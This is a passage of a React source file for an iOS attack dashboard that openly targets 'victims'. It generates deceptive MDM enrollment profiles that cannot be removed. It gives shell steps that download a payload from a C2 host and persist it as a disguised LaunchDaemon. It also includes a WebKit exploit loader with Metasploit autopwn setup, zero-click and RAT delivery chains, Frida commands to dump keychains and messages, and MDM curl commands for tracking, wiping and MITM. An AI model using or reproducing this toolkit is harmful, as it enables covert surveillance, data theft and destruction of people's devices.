                    ))}
                  </div>
                </div>
              ))}
            </div>
            <div className="mt-5 border border-cyan-900/20 rounded p-4 bg-cyan-950/5">
              <div className="text-[9px] text-cyan-600 mb-2">UNIVERSAL FALLBACK (ALL VERSIONS)</div>
              <div className="text-[8px] text-green-700 space-y-1">
                <div>1. Generate MDM profile → host at https://YOUR_C2/enroll</div>
                <div>2. Victim opens URL → Settings → Install (2 taps total)</div>
                <div>3. MDM commands: LocationQuery, InstallApplication, Push VPN, Install CA</div>
                <div>4. For app data (messages, keychain): jailbreak + Frida scripts in Post-Exploit tab</div>
              </div>
            </div>
          </div>
        )}

        {/* ════════════════════════════
            MDM PROFILE
        ════════════════════════════ */}
        {tab === "mdm" && (
          <div>
            <h2 className="text-[11px] tracking-widest text-cyan-400 mb-1">MDM ENROLLMENT PROFILE GENERATOR</h2>
            <p className="text-[8px] text-green-900/50 mb-4">
              Works on ALL iOS versions 14–18. No jailbreak needed. User visits a URL → taps Install →
              you get a full MDM channel: location, remote wipe, app install, VPN push, cert install (TLS MITM).
            </p>

            {/* Capabilities */}
            <div className="border border-cyan-900/20 rounded p-4 mb-5 bg-cyan-950/5">
              <div className="text-[9px] text-cyan-600 mb-3">MDM CHANNEL CAPABILITIES</div>
              <div className="grid grid-cols-3 gap-2">
                {MDM_CAPABILITIES.map(({ label, supported, note }) => (
                  <div key={label} className={`flex items-start gap-2 text-[7px] ${supported ? "text-green-700" : "text-green-900/30"}`}>
                    <span className="shrink-0">{supported ? "✅" : "❌"}</span>
                    <div>
                      <div className={supported ? "text-green-400" : "text-green-900/30"}>{label}</div>
                      <div className="text-[6px] mt-0.5">{note}</div>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Form */}
            <div className="grid grid-cols-2 gap-5 mb-5">
              <div className="space-y-3">
                <div>
                  <label className="text-[8px] text-green-700 block mb-1">MDM SERVER URL</label>
                  <input value={mdmServer} onChange={e => setMdmServer(e.target.value)}
                    className="w-full bg-black/30 border border-green-900/30 rounded px-3 py-2 text-[9px] text-green-400 outline-none focus:border-green-700/50"
                    placeholder="https://your-c2-server.com" />
                  <div className="text-[7px] text-green-900/30 mt-0.5">Your C2/MDM server where devices check in</div>
                </div>
                <div>
                  <label className="text-[8px] text-green-700 block mb-1">ORGANIZATION NAME</label>
                  <input value={mdmOrg} onChange={e => setMdmOrg(e.target.value)}
                    className="w-full bg-black/30 border border-green-900/30 rounded px-3 py-2 text-[9px] text-green-400 outline-none focus:border-green-700/50"
                    placeholder="IT Department" />
                  <div className="text-[7px] text-green-900/30 mt-0.5">Shown to user during install — make it convincing</div>
                </div>
                <div>
                  <label className="text-[8px] text-green-700 block mb-1">PROFILE DISPLAY NAME</label>
                  <input value={mdmProfile} onChange={e => setMdmProfile(e.target.value)}
                    className="w-full bg-black/30 border border-green-900/30 rounded px-3 py-2 text-[9px] text-green-400 outline-none focus:border-green-700/50"
                    placeholder="Mobile Device Management" />
                </div>
                <label className="flex items-center gap-2 cursor-pointer">
                  <div onClick={() => setMdmRemLock(!mdmRemLock)}
                    className={`w-8 h-4 rounded-full border transition-all flex items-center ${
                      mdmRemLock ? "border-red-700 bg-red-950/30" : "border-green-900/30"
                    }`}>
                    <div className={`w-3 h-3 rounded-full transition-all mx-0.5 ${mdmRemLock ? "bg-red-600 ml-4" : "bg-green-900/30"}`} />
                  </div>
                  <span className="text-[8px] text-green-700">Lock profile removal (user cannot remove)</span>
                </label>
                <button onClick={generateMdmProfile} disabled={mdmLoading}
                  className="w-full py-2.5 border border-cyan-700/50 text-cyan-400 rounded text-[9px] hover:bg-cyan-950/20 transition-all disabled:opacity-40">
                  {mdmLoading ? "GENERATING…" : "▶ GENERATE MDM PROFILE"}
                </button>
              </div>

              {/* Preview / result */}
              <div className="border border-green-900/15 rounded p-3">
                {mdmResult ? (
                  mdmResult.ok ? (
                    <div className="space-y-3">
                      {mdmResult.url && (
                        <div>
                          <div className="text-[8px] text-green-600 mb-1">DELIVERY URL (send to victim)</div>
                          <div className="flex items-center gap-2">
                            <code className="flex-1 text-[8px] text-cyan-400 bg-black/30 rounded px-2 py-1 overflow-hidden">{mdmResult.url}</code>
                            <button onClick={() => copy(mdmResult.url!, "url")} className="text-[7px] text-green-900/40 hover:text-green-500 px-1">
                              {copiedId === "url" ? "✓" : "copy"}
                            </button>
                          </div>
                        </div>
                      )}
                      {mdmResult.instructions && (
                        <div>
                          <div className="text-[8px] text-green-600 mb-1">VICTIM STEPS (automatic after URL open)</div>
                          {mdmResult.instructions.map((s, i) => (
                            <div key={i} className="text-[8px] text-green-700 flex gap-2 mb-0.5">
                              <span className="text-green-900/40">{i + 1}.</span>{s}
                            </div>
                          ))}
                        </div>
                      )}
                      {mdmResult.xml && (
                        <div>
                          <div className="flex items-center justify-between mb-1">
                            <span className="text-[8px] text-green-600">PROFILE XML (.mobileconfig)</span>
                            <button onClick={() => copy(mdmResult.xml!, "xml")} className="text-[7px] text-green-900/40 hover:text-green-500">
                              {copiedId === "xml" ? "✓ copied" : "copy"}
                            </button>
                          </div>
                          <pre className="text-[7px] text-green-400 bg-black/40 rounded p-2 overflow-auto max-h-52 leading-4 border border-green-900/10">{mdmResult.xml}</pre>
                        </div>
                      )}
                    </div>
                  ) : (
                    <div className="text-red-500 text-[8px]">Error: {mdmResult.error}</div>
                  )
                ) : (
                  <div className="text-[8px] text-green-900/30 space-y-1">
                    <div>Fill in the form and click Generate.</div>
                    <div className="mt-3 text-green-900/20">
                      Profile will include:<br/>
                      • MDM enrollment payload<br/>
                      • CA certificate (for TLS intercept)<br/>
                      • VPN profile (route traffic through your server)<br/>
                      • WiFi profile (auto-connect to your network)<br/>
                      • Email account config<br/>
                      • Access rights: 8191 (full MDM control)
                    </div>
                  </div>
                )}
              </div>
            </div>

            {/* How to host */}
            <div className="border border-green-900/10 rounded p-4">
              <div className="text-[9px] text-green-700 mb-3">HOW TO HOST THE MDM SERVER</div>
              <div className="grid grid-cols-2 gap-3">
                {[
                  {
                    label: "MicroMDM (open-source)",
                    code: `# On your VPS:\ndocker run -d --name micromdm \\\n  -p 443:443 \\\n  -e SERVER_URL=https://your-server.com \\\n  -e API_KEY=your-secret-key \\\n  micromdm/micromdm:latest\n\n# Deliver profile URL to victim:\nhttps://your-server.com/enroll`,
                  },
                  {
                    label: "Nanomdm (lightweight)",
                    code: `# Clone and build:\ngit clone https://github.com/micromdm/nanomdm\ncd nanomdm && go build ./cmd/nanomdm\n\n# Run:\n./nanomdm \\\n  -cert mdm.crt -key mdm.key \\\n  -api-key your-api-key \\\n  -listen :9000`,
                  },
                ].map(({ label, code }) => (
                  <div key={label} className="relative">
                    <div className="text-[8px] text-green-600 mb-1">{label}</div>
                    <pre className="text-[7px] text-green-300 bg-black/40 rounded p-2 border border-green-900/10 leading-5 overflow-x-auto">{code}</pre>
                    <button onClick={() => copy(code, label)} className="absolute top-5 right-1 text-[6px] text-green-900/40 hover:text-green-500 px-1 border border-green-900/20 rounded">
                      {copiedId === label ? "✓" : "cp"}
                    </button>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* ════════════════════════════
            JAILBREAK
        ════════════════════════════ */}
        {tab === "jailbreak" && (
          <div>
            <h2 className="text-[11px] tracking-widest text-cyan-400 mb-1">JAILBREAK TOOLKIT</h2>
            <p className="text-[8px] text-green-900/50 mb-4">
              Full root access. Frida, OpenSSH, Cydia/Sileo. Every app&apos;s data, database, keychain — all accessible.
            </p>

            {/* JB selector */}
            <div className="flex gap-2 mb-4 flex-wrap">
              {JAILBREAKS.map((jb, i) => (
                <button key={jb.name} onClick={() => setSelectedJb(i)}
                  className={`px-2 py-1.5 text-[8px] border rounded transition-all ${
                    selectedJb === i ? "border-green-700/50 text-green-300 bg-green-950/20" : "border-green-900/20 text-green-800 hover:border-green-800/30"
                  }`}>{jb.name}</button>
              ))}
            </div>

            {(() => {
              const jb = JAILBREAKS[selectedJb];
              return (
                <div className="grid grid-cols-2 gap-5">
                  <div className="space-y-3">
                    <div className="border border-green-900/20 rounded p-4">
                      <div className="space-y-2">
                        {[
                          { label: "iOS Range",      val: jb.iosRange },
                          { label: "Chip Range",     val: jb.chipRange },
                          { label: "Type",           val: jb.type },
                          { label: "Persistent",     val: jb.persistent ? "Yes — survives reboots" : "No — re-run after each boot (USB, ~20s)" },
                          { label: "Detectability",  val: jb.detectability + " (no notification to user)" },
                          { label: "Post-install",   val: jb.postInstall },
                        ].map(({ label, val }) => (
                          <div key={label} className="flex gap-3 text-[8px]">
                            <span className="text-green-900/40 w-24 shrink-0">{label}</span>
                            <span className="text-green-400">{val}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                    <div className="border border-green-900/15 rounded p-3">
                      <div className="text-[8px] text-green-600 mb-2">METHOD</div>
                      <p className="text-[8px] text-green-700/60">{jb.method}</p>
                    </div>
                  </div>
                  <div className="border border-green-900/15 rounded p-4">
                    <div className="text-[8px] text-green-600 mb-3">STEP-BY-STEP</div>
                    <div className="space-y-1.5">
                      {jb.steps.map((s, i) => (
                        <div key={i} className="flex gap-2 text-[8px]">
                          <span className="text-green-900/30 shrink-0 w-4">{i + 1}.</span>
                          <span className={s.startsWith("NOTE:") ? "text-yellow-600" : "text-green-700"}>{s}</span>
                        </div>
                      ))}
                    </div>

                    {jb.name === "checkra1n" || jb.name === "palera1n" ? (
                      <div className="mt-4 border-t border-green-900/10 pt-3">
                        <div className="text-[8px] text-green-600 mb-2">AFTER JAILBREAK — MSF SESSION VIA SSH</div>
                        <pre className="text-[7px] text-green-300 bg-black/30 rounded p-2 leading-5 overflow-x-auto">{`# SSH into jailbroken device
ssh root@<DEVICE_IP> -p 22
# Password: alpine

# Drop Meterpreter payload
wget http://YOUR_C2/ios_payload -O /tmp/payload
chmod +x /tmp/payload

# Install Frida
pip3 install frida-tools

# Persistent launch via LaunchDaemon
cat > /Library/LaunchDaemons/com.system.update.plist <<EOF
<?xml version="1.0"?>
<plist version="1.0"><dict>
  <key>Label</key><string>com.system.update</string>
  <key>ProgramArguments</key>
  <array><string>/tmp/payload</string></array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
</dict></plist>
EOF
launchctl load /Library/LaunchDaemons/com.system.update.plist`}</pre>
                      </div>
                    ) : null}
                  </div>
                </div>
              );
            })()}
          </div>
        )}

        {/* ════════════════════════════
            WEBKIT CVEs
        ════════════════════════════ */}
        {tab === "webkit" && (
          <div>
            <h2 className="text-[11px] tracking-widest text-cyan-400 mb-1">WEBKIT EXPLOIT CHAIN — iOS 14→18</h2>
            <p className="text-[8px] text-green-900/50 mb-4">
              Browser-based exploits — victim visits a URL (or zero-click iMessage) → code execution.
              No install dialog, no user interaction required on zero-click CVEs.
            </p>

            <div className="space-y-3 mb-5">
              {WEBKIT_CVES.map((cve) => (
                <div key={cve.cve}
                  onClick={() => setWebkitCve(cve.cve)}
                  className={`border rounded p-4 cursor-pointer transition-all ${
                    webkitCve === cve.cve ? "border-red-700/40 bg-red-950/10" : "border-green-900/15 hover:border-green-800/20"
                  }`}>
                  <div className="flex items-start gap-4">
                    <div className={`text-[7px] px-2 py-0.5 rounded border shrink-0 mt-0.5 ${
                      cve.severity === "CRITICAL" ? "text-red-400 border-red-900/40" : "text-yellow-500 border-yellow-900/40"
                    }`}>{cve.severity}</div>
                    <div className="flex-1">
                      <div className="flex items-center gap-3 mb-1">
                        <span className="text-[10px] text-red-400 font-bold">{cve.cve}</span>
                        <span className="text-[7px] text-green-900/40">iOS {cve.ios}</span>
                        <span className="text-[7px] border border-cyan-900/30 text-cyan-800 px-1.5 rounded">{cve.vector}</span>
                      </div>
                      <div className="text-[8px] text-green-600 mb-0.5">{cve.type}</div>
                      <div className="text-[7px] text-green-900/50">{cve.impact}</div>
                    </div>
                  </div>
                </div>
              ))}
            </div>

            {/* WebKit exploitation chain guide */}
            <div className="border border-green-900/15 rounded p-4">
              <div className="text-[9px] text-green-700 mb-3">BUILDING A WEBKIT EXPLOIT SERVER</div>
              <div className="grid grid-cols-2 gap-3">
                {[
                  {
                    label: "Host exploit HTML on your C2",
                    code: `# Serve malicious HTML over HTTPS (required for iOS)
# Structure:
cat > /var/www/html/exploit.html <<'EOF'
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<script>
// WebKit exploit shellcode loader
// Replace with actual CVE PoC for target iOS version
fetch('/stage2.bin').then(r => r.arrayBuffer()).then(buf => {
  // trigger CVE — type confusion / UAF / OOB write
  var jit = new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array(buf)));
  jit.exports.exploit();
});
</script>
</html>
EOF

# Send victim the link via iMessage/email/social:
# https://your-server.com/exploit.html`,
                  },
                  {
                    label: "MSF browser_autopwn2 module",
                    code: `# In msfconsole — browser exploit handler:
use auxiliary/server/browser_autopwn2
set LHOST 0.0.0.0
set LPORT 8080
set SRVPORT 80
set URIPATH /update

# Set iOS-specific payloads
set AllowedAddresses 0.0.0.0/0
run

# Share URL: http://YOUR_C2:80/update
# When iOS victim opens → exploit fires → Meterpreter session

# For HTTPS (required on newer iOS):
use auxiliary/server/capture/http
set SSL true
set SSLCERT /path/to/cert.pem`,
                  },
                ].map(({ label, code }) => (
                  <div key={label} className="relative">
                    <div className="text-[8px] text-green-600 mb-1">{label}</div>
                    <pre className="text-[7px] text-green-300 bg-black/40 rounded p-2 border border-green-900/10 leading-5 overflow-x-auto max-h-48">{code}</pre>
                    <button onClick={() => copy(code, label)} className="absolute top-5 right-1 text-[6px] text-green-900/40 hover:text-green-500 px-1 border border-green-900/10 rounded">
                      {copiedId === label ? "✓" : "cp"}
                    </button>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* ════════════════════════════
            DELIVERY CHAIN
        ════════════════════════════ */}
        {tab === "delivery" && (
          <div>
            <h2 className="text-[11px] tracking-widest text-cyan-400 mb-1">DELIVERY CHAIN — ALL PATHS</h2>
            <p className="text-[8px] text-green-900/50 mb-4">
              Full delivery chains per iOS version. Select method → get exact steps and URLs.
            </p>

            <div className="grid grid-cols-2 gap-3 mb-5">
              {[
                { id: "mdm" as const,        label: "MDM Profile",        ios: "ALL versions",    desc: "Visit URL → tap Install (2 taps) → full MDM channel", friction: "Low" },
                { id: "trollstore" as const, label: "TrollStore IPA",     ios: "14.0 – 17.0b4",  desc: "Permanent IPA install — no Apple account, no expiry", friction: "Medium" },
                { id: "webkit" as const,     label: "WebKit Exploit",     ios: "version-matched", desc: "Visit URL → silent code execution, no install dialog", friction: "Zero" },
                { id: "enterprise" as const, label: "Enterprise Cert IPA",ios: "ALL versions",    desc: "Signed IPA with developer/enterprise cert — opens like any app", friction: "Low" },
              ].map(({ id, label, ios, desc, friction }) => (
                <button key={id} onClick={() => setDelivMethod(id)}
                  className={`border rounded p-4 text-left transition-all ${
                    delivMethod === id ? "border-cyan-700/40 bg-cyan-950/10" : "border-green-900/20 hover:border-green-800/30"
                  }`}>
                  <div className="text-[9px] text-green-400 mb-1">{label}</div>
                  <div className="text-[7px] text-cyan-700 mb-1">iOS: {ios}</div>
                  <div className="text-[7px] text-green-900/50 mb-2">{desc}</div>
                  <div className={`text-[7px] border rounded px-1.5 py-0.5 inline-block ${
                    friction === "Zero" ? "border-green-700/30 text-green-600" :
                    friction === "Low"  ? "border-cyan-900/30 text-cyan-700" : "border-yellow-900/30 text-yellow-700"
                  }`}>{friction} friction</div>
                </button>
              ))}
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="border border-green-900/15 rounded p-4">
                <div className="text-[9px] text-green-600 mb-3">
                  {delivMethod === "mdm" ? "MDM DELIVERY CHAIN" :
                   delivMethod === "trollstore" ? "TROLLSTORE DELIVERY CHAIN" :
                   delivMethod === "webkit" ? "WEBKIT EXPLOIT DELIVERY" : "ENTERPRISE CERT DELIVERY"}
                </div>

                {delivMethod === "mdm" && (
                  <div className="space-y-2 text-[8px]">
                    {[
                      "Set up MicroMDM or NanoMDM on your VPS (see MDM tab)",
                      "Generate .mobileconfig profile from MDM Profile tab",
                      "Host profile at https://your-server.com/enroll",
                      "Send victim a convincing link (email/SMS/social) to the URL",
                      "Victim opens URL in Safari → 'Profile Downloaded' banner appears",
                      "Victim: Settings → General → VPN & Device Management → Install",
                      "Device enrolled — shows in your MDM console",
                      "Push commands: location query, app install, VPN profile, cert push",
                      "For location: send MDM LocationQuery command → real-time GPS",
                    ].map((s, i) => (
                      <div key={i} className="flex gap-2">
                        <span className="text-green-900/30 w-4 shrink-0">{i + 1}.</span>
                        <span className="text-green-700">{s}</span>
                      </div>
                    ))}
                  </div>
                )}

                {delivMethod === "trollstore" && (
                  <div className="space-y-2 text-[8px]">
                    {[
                      "Target must be on iOS 14.0–17.0b4 (check exact build for 17)",
                      "First install TrollStore on target (one-time, requires brief physical/ADB access)",
                      "TrollStore install: iOS 15-16.6.1 → use misaka (no computer needed)",
                      "TrollStore install: iOS 14 → use TrollInstaller via AltStore (needs computer once)",
                      "Once TrollStore is installed: build your RAT as a .ipa file",
                      "Host IPA at https://your-server.com/app.ipa",
                      "Victim: tap IPA link in Safari → TrollStore opens → Install",
                      "App installs permanently — no expiry, no revocation",
                      "App persists through reboots, no re-signing needed",
                    ].map((s, i) => (
                      <div key={i} className="flex gap-2">
                        <span className="text-green-900/30 w-4 shrink-0">{i + 1}.</span>
                        <span className="text-green-700">{s}</span>
                      </div>
                    ))}
                  </div>
                )}

                {delivMethod === "webkit" && (
                  <div className="space-y-2 text-[8px]">
                    {[
                      "Identify victim's iOS version (MDM query, social engineering, or assume range)",
                      "Select matching CVE from WebKit CVEs tab",
                      "Host exploit HTML on your HTTPS server",
                      "For zero-click (CVE-2021-30860, CVE-2023-41064): send iMessage/AirDrop with payload",
                      "For one-click: send URL via email/SMS/social — victim taps link",
                      "Safari opens → exploit fires → MSF multi/handler receives session",
                      "Note: WebKit sessions may not be persistent — chain with LaunchDaemon dropper",
                      "After RCE: drop binary to /tmp, make executable, establish reverse shell",
                      "For persistence without JB: chain with MDM profile install via RCE",
                    ].map((s, i) => (
                      <div key={i} className="flex gap-2">
                        <span className="text-green-900/30 w-4 shrink-0">{i + 1}.</span>
                        <span className="text-green-700">{s}</span>
                      </div>
                    ))}
                  </div>
                )}

                {delivMethod === "enterprise" && (
                  <div className="space-y-2 text-[8px]">
                    {[
                      "Requires: Apple Developer account ($99/yr) OR stolen enterprise cert",
                      "Create entitlements.plist with required capabilities",
                      "Build iOS payload IPA (Xcode or xcrun)",
                      "Sign IPA: codesign --force --sign 'iPhone Distribution: <CERT_NAME>' app.ipa",
                      "Host IPA + manifest.plist on HTTPS server",
                      "Delivery URL: itms-services://?action=download-manifest&url=https://your-server.com/manifest.plist",
                      "Victim: taps link → 'Do you want to install...' dialog → tap Install",
                      "App opens like any normal app — no 'untrusted' warning (if cert is valid)",
                      "Cert expiry: standard certs valid 1 year. Enterprise certs longer.",
                    ].map((s, i) => (
                      <div key={i} className="flex gap-2">
                        <span className="text-green-900/30 w-4 shrink-0">{i + 1}.</span>
                        <span className="text-green-700">{s}</span>
                      </div>
                    ))}
                  </div>
                )}
              </div>

              <div className="border border-green-900/15 rounded p-4">
                <div className="text-[9px] text-green-600 mb-3">DELIVERY AUTOMATION</div>
                <div className="mb-3">
                  <label className="text-[8px] text-green-700 block mb-1">SESSION ID (if device already enrolled)</label>
                  <input value={delivSession} onChange={e => setDelivSession(e.target.value)}
                    className="w-full bg-black/30 border border-green-900/30 rounded px-3 py-1.5 text-[9px] text-green-400 outline-none"
                    placeholder="MSF session ID or MDM UDID" />
                </div>
                <button onClick={runDelivery} disabled={delivLoading}
                  className="w-full py-2 border border-cyan-700/40 text-cyan-400 rounded text-[9px] hover:bg-cyan-950/20 transition-all disabled:opacity-40 mb-3">
                  {delivLoading ? "RUNNING…" : "▶ EXECUTE DELIVERY"}
                </button>
                {delivResult && (
                  delivResult.ok ? (
                    <div className="space-y-2">
                      {delivResult.url && (
                        <div>
                          <div className="text-[8px] text-green-600 mb-0.5">URL</div>
                          <div className="flex items-center gap-1">
                            <code className="flex-1 text-[7px] text-cyan-400 bg-black/30 px-2 py-1 rounded overflow-hidden">{delivResult.url}</code>
                            <button onClick={() => copy(delivResult.url!, "durl")} className="text-[6px] text-green-900/40 hover:text-green-500 px-1">cp</button>
                          </div>
                        </div>
                      )}
                      {delivResult.instructions?.map((s, i) => (
                        <div key={i} className="text-[8px] text-green-700 flex gap-1">
                          <span className="text-green-900/30">{i + 1}.</span>{s}
                        </div>
                      ))}
                    </div>
                  ) : <div className="text-red-500 text-[8px]">{delivResult.error}</div>
                )}
              </div>
            </div>
          </div>
        )}

        {/* ════════════════════════════
            POST-EXPLOIT
        ════════════════════════════ */}
        {tab === "postexploit" && (
          <div>
            <h2 className="text-[11px] tracking-widest text-cyan-400 mb-1">POST-EXPLOITATION — FRIDA SCRIPTS</h2>
            <p className="text-[8px] text-green-900/50 mb-4">
              Production-ready Frida scripts for jailbroken devices. Dump keychain, messages, contacts,
              location, WhatsApp, Instagram — all app data. Run via SSH after jailbreak.
            </p>

            {/* Quick deploy */}
            <div className="border border-green-900/15 rounded p-4 mb-4">
              <div className="text-[9px] text-green-600 mb-2">FRIDA QUICK DEPLOY</div>
              <pre className="text-[8px] text-green-300 bg-black/40 rounded p-3 leading-5 overflow-x-auto border border-green-900/10">{`# On your Kali/Mac:
pip3 install frida-tools

# Connect to jailbroken iOS device via USB or SSH:
frida-ps -U                          # list running processes (USB)
frida-ps -H <DEVICE_IP>:27042        # list via TCP/WiFi

# Run a script against a specific app:
frida -U -l keychain.js -f com.apple.springboard --no-pause     # SpringBoard
frida -U -l messages.js  -f com.apple.MobileSMS                 # iMessage/SMS
frida -U -l whatsapp.js  -f net.whatsapp.WhatsApp                # WhatsApp
frida -U -l instagram.js -f com.burbn.instagram                  # Instagram
frida -U -l location.js  -f com.apple.springboard --no-pause     # GPS stream

# Start Frida server on device via SSH:
ssh root@<DEVICE_IP>
/usr/sbin/frida-server &             # start Frida server (background)
frida-server -l 0.0.0.0:27042 &     # or specific TCP port`}</pre>
            </div>

            {/* Script tabs */}
            <div className="flex gap-2 mb-4 flex-wrap">
              {(Object.keys(FRIDA_SCRIPTS) as Array<keyof typeof FRIDA_SCRIPTS>).map(k => (
                <button key={k} onClick={() => setSelectedFrida(k)}
                  className={`px-2 py-1.5 text-[8px] border rounded transition-all ${
                    selectedFrida === k ? "border-green-700/50 text-green-300 bg-green-950/20" : "border-green-900/20 text-green-800 hover:border-green-800/30"
                  }`}>{k}</button>
              ))}
            </div>

            <div className="relative">
              <pre className="text-[8px] text-green-300 bg-black/40 rounded p-4 leading-5 border border-green-900/10 overflow-x-auto max-h-[500px]">
                {FRIDA_SCRIPTS[selectedFrida]}
              </pre>
              <button onClick={() => copy(FRIDA_SCRIPTS[selectedFrida], "frida")}
                className="absolute top-2 right-2 text-[7px] text-green-900/40 hover:text-green-500 px-2 py-0.5 border border-green-900/20 rounded">
                {copiedId === "frida" ? "✓ copied" : "copy"}
              </button>
            </div>

            {/* MDM post-exploitation commands */}
            <div className="border border-green-900/15 rounded p-4 mt-4">
              <div className="text-[9px] text-green-600 mb-3">MDM COMMANDS (no jailbreak needed)</div>
              <div className="grid grid-cols-2 gap-3">
                {[
                  { label: "Location Query",    cmd: `curl -X POST https://your-mdm/v1/commands \\\n  -H 'Authorization: Bearer YOUR_API_KEY' \\\n  -d '{"udid":"DEVICE_UDID","request_type":"LocationQuery"}'` },
                  { label: "Remote Wipe",       cmd: `curl -X POST https://your-mdm/v1/commands \\\n  -d '{"udid":"DEVICE_UDID","request_type":"EraseDevice","PIN":"123456"}'` },
                  { label: "Install App",       cmd: `curl -X POST https://your-mdm/v1/commands \\\n  -d '{"udid":"DEVICE_UDID","request_type":"InstallApplication",\n     "manifest_url":"https://your-server.com/manifest.plist"}'` },
                  { label: "Install CA Cert",   cmd: `curl -X POST https://your-mdm/v1/commands \\\n  -d '{"udid":"DEVICE_UDID","request_type":"CertificateList"}\n# Then push CA to intercept all HTTPS traffic via MITM` },
                  { label: "Push VPN Profile",  cmd: `curl -X POST https://your-mdm/v1/profiles \\\n  -d '{"udid":"DEVICE_UDID","mobileconfig":"BASE64_VPN_PROFILE"}\n# Route all iOS traffic through your VPN` },
                  { label: "Screen Lock",       cmd: `curl -X POST https://your-mdm/v1/commands \\\n  -d '{"udid":"DEVICE_UDID","request_type":"DeviceLock","PIN":"000000"}'` },
                ].map(({ label, cmd }) => (
                  <div key={label} className="relative">
                    <div className="text-[7px] text-green-700 mb-1">{label}</div>
                    <pre className="text-[7px] text-green-400 bg-black/30 rounded p-2 leading-4 overflow-x-auto border border-green-900/10">{cmd}</pre>
                    <button onClick={() => copy(cmd, label)} className="absolute top-5 right-1 text-[6px] text-green-900/40 hover:text-green-500 px-0.5 border border-green-900/10 rounded">
                      {copiedId === label ? "✓" : "cp"}
                    </button>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
